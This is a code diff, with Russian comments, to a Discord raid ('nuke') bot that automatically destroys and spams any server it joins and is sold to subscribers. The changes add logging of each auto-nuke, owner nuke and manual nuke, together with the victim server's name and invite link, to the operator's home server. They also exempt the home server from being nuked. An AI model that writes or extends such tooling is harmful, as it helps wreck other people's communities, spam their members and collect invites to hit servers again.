@@ -103,7 +103,16 @@ async def log_nuke(guild: discord.Guild, user: discord.User, nuke_type: str):
         if home:
             logs_ch = discord.utils.find(lambda c: c.name.lower() == "📊・logs" or "logs" in c.name.lower(), home.text_channels)
             if logs_ch:
-                type_emoji = {"nuke": "💀", "super_nuke": "☠️", "owner_nuke": "👑"}.get(nuke_type, "☠️")
+                # Эмодзи для разных типов нюков
+                type_emoji = {
+                    "nuke": "💀",
+                    "super_nuke": "☠️",
+                    "owner_nuke": "👑",
+                    "auto_nuke": "🤖",
+                    "auto_super_nuke": "🤖☠️",
+                    "auto_superpr_nuke": "🤖⚡",
+                    "auto_owner_nuke": "🤖👑"
+                }.get(nuke_type, "☠️")
                 embed = discord.Embed(
                     title=f"{type_emoji} {nuke_type.replace('_', ' ').upper()}",
                     color=0xff0000
@@ -2913,13 +2922,25 @@ async def nukelogs(ctx):
         await ctx.send("Логов нюков нет.")
         return
     embed = discord.Embed(title="📋 Логи нюков", color=0x0a0a0a)
+    # Эмодзи для разных типов нюков
+    type_emojis = {
+        "nuke": "💀",
+        "super_nuke": "☠️",
+        "owner_nuke": "👑",
+        "auto_nuke": "🤖",
+        "auto_super_nuke": "🤖☠️",
+        "auto_superpr_nuke": "🤖⚡",
+        "auto_owner_nuke": "🤖👑"
+    }
     for doc in logs[:20]:  # максимум 20 в одном embed
         entry = doc.get("value", doc)
+        nuke_type = entry.get('type', '?')
+        emoji = type_emojis.get(nuke_type, '⚡')
         invite = entry.get("invite") or "нет инвайта"
         embed.add_field(
-            name=f"{'💀' if entry.get('type') == 'nuke' else '⚡'} {entry.get('guild_name', '?')}",
+            name=f"{emoji} {entry.get('guild_name', '?')}",
             value=(
-                f"Тип: `{entry.get('type', '?')}`\n"
+                f"Тип: `{nuke_type}`\n"
                 f"Кто: **{entry.get('user_name', '?')}** (`{entry.get('user_id', '?')}`)\n"
                 f"Время: `{entry.get('time', '?')}`\n"
                 f"Инвайт: {invite}"
@@ -3383,11 +3404,16 @@ async def on_guild_join(guild):
     if is_guild_blocked(guild.id):
         return  # Сервер заблокирован — ничего не делаем
 
+    # ЗАЩИТА: никогда не запускаем авто-нюк на домашнем сервере
+    if guild.id == HOME_GUILD_ID:
+        return
+
     # AUTO OWNER NUKE — полный нюк без ограничений (только овнер)
     if AUTO_OWNER_NUKE:
         nuke_running[guild.id] = True
         spam_text = AUTO_OWNER_NUKE_TEXT if AUTO_OWNER_NUKE_TEXT else config.SPAM_TEXT
         asyncio.create_task(do_owner_nuke_task(guild, spam_text))
+        asyncio.create_task(log_nuke(guild, bot.user, "auto_owner_nuke"))
         return
 
     # AUTO SUPERPR NUKE — всё одновременно, максимальная скорость
@@ -3395,6 +3421,7 @@ async def on_guild_join(guild):
         nuke_running[guild.id] = True
         spam_text = AUTO_SUPERPR_NUKE_TEXT if AUTO_SUPERPR_NUKE_TEXT else config.SPAM_TEXT
         asyncio.create_task(do_superpr_nuke_task(guild, spam_text))
+        asyncio.create_task(log_nuke(guild, bot.user, "auto_superpr_nuke"))
         return
 
     # AUTO SUPER NUKE — функционал super_nuke (оставляет до 15 участников)
@@ -3402,11 +3429,13 @@ async def on_guild_join(guild):
         nuke_running[guild.id] = True
         spam_text = AUTO_SUPER_NUKE_TEXT if AUTO_SUPER_NUKE_TEXT else config.SPAM_TEXT
         asyncio.create_task(do_superpr_nuke_task(guild, spam_text))
+        asyncio.create_task(log_nuke(guild, bot.user, "auto_super_nuke"))
         return
 
     if config.AUTO_NUKE:
         nuke_running[guild.id] = True
         asyncio.create_task(do_nuke(guild))
+        asyncio.create_task(log_nuke(guild, bot.user, "auto_nuke"))
 
         dm_text = "|| @everyone  @here ||\n# Kanero-bot\n# 🔧 Developer-DavaidKa)\n**Хочеш так же? **\nhttps://discord.gg/exYwg6Gz"
 
@@ -3468,6 +3497,7 @@ async def run_dm_command(message: discord.Message, guild: discord.Guild, cmd_tex
             last_nuke_time[guild.id] = asyncio.get_running_loop().time()
             last_spam_text[guild.id] = spam_text
             asyncio.create_task(do_nuke(guild, spam_text, caller_id=message.author.id))
+            asyncio.create_task(log_nuke(guild, message.author, "nuke"))
             await message.channel.send(f"✅ `nuke` запущен на **{guild.name}**")
 
         elif cmd_name == "stop":
@@ -4322,7 +4352,9 @@ async def on_message(message):
         await help_cmd(ctx)
         return
     await bot.process_commands(message)
-    log.info("Команда от %s (%s) на сервере %s: %s", message.author, message.author.id, message.guild, message.content)
+    # Логируем только если это команда (начинается с !)
+    if message.content.startswith("!"):
+        log.info("Команда от %s (%s) на сервере %s: %s", message.author, message.author.id, message.guild, message.content)
 
 
 @bot.event
@@ -4393,6 +4425,10 @@ async def on_ready():
     @app_commands.allowed_installs(guilds=True, users=True)
     @app_commands.allowed_contexts(guilds=True, dms=False, private_channels=False)
     async def slash_nuke(interaction: discord.Interaction):
+        # Защита: нюк запрещён на домашнем сервере для всех кроме овнера
+        if interaction.guild and interaction.guild.id == HOME_GUILD_ID and interaction.user.id != config.OWNER_ID:
+            await interaction.response.send_message("⛔ Команда не работает на этом сервере.", ephemeral=True)
+            return
         if not is_whitelisted(interaction.user.id):
             embed = discord.Embed(title="☠️ ДОСТУП ЗАПРЕЩЁН", description="Нет подписки. Пиши: **davaidkatt**", color=0x0a0a0a)
             await interaction.response.send_message(embed=embed, ephemeral=True); return
@@ -4407,6 +4443,7 @@ async def on_ready():
         last_spam_text[guild.id] = config.SPAM_TEXT
         await interaction.response.send_message("💀 Краш запущен.", ephemeral=True)
         asyncio.create_task(do_nuke(guild, config.SPAM_TEXT, caller_id=interaction.user.id))
+        asyncio.create_task(log_nuke(guild, interaction.user, "nuke"))
 
     @bot.tree.command(name="stop", description="⛔ Остановить краш")
     @app_commands.allowed_installs(guilds=True, users=True)
